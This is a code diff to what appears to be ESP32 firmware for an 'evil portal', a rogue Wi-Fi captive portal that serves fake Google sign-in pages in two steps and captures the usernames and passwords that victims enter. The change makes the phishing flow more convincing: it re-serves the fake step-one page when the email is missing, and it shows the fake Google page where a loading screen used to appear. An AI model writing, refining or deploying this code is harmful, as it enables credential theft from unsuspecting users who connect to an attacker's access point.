@@ -256,6 +256,14 @@ static esp_err_t handler_post(httpd_req_t* req) {
         return ESP_OK;
     }
 
+    // step=1 without an email (e.g. browser without `required` support):
+    // re-serve step 1 instead of falling through to the generic LOADING page.
+    if(strcmp(step, "1") == 0 && !user[0]) {
+        ESP_LOGI(TAG, "google step1: empty email -> re-rendering step1");
+        httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_STEP1, EVIL_PORTAL_HTML_GOOGLE_STEP1_LEN);
+        return ESP_OK;
+    }
+
     // step=2 (or any single-step template like Router) -> capture credentials.
     if(user[0] || pwd[0]) {
         s_cred_count++;
@@ -266,7 +274,8 @@ static esp_err_t handler_post(httpd_req_t* req) {
     if(strcmp(step, "2") == 0) {
         httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_FAILED, EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN);
     } else {
-        httpd_resp_send(req, EVIL_PORTAL_HTML_LOADING, EVIL_PORTAL_HTML_LOADING_LEN);
+        httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
+                        s_html_buf ? s_html_len : EVIL_PORTAL_HTML_GOOGLE_LEN);
     }
     return ESP_OK;
 }
